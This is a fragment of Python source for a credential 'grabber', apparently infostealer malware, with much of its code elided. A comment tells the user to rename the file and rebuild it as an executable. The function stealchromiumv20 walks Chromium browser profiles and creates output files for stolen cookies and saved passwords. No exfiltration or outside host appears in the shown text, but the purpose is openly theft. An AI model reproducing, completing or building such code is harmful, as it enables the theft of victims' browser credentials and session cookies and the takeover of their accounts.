#if the original grabber file doesn't work, rename this to grvbber.py and rebuild the exe
import os
import ctypes
import io
import platform
...
def stealchromiumv20():
    ...
    if config.browsers:
        ...
        for name, path in chromium_paths.items():
            ...
            for profile in profiles:
                os.makedirs(os.path.join(output, 'ChromiumV20', name, profile), exist_ok=True)
                cookieoutput = os.path.join(output, 'ChromiumV20', name, profile, 'Cookies.txt')
                passwordoutput = os.path.join(output, 'ChromiumV20', name, profile, 'Passwords.txt')
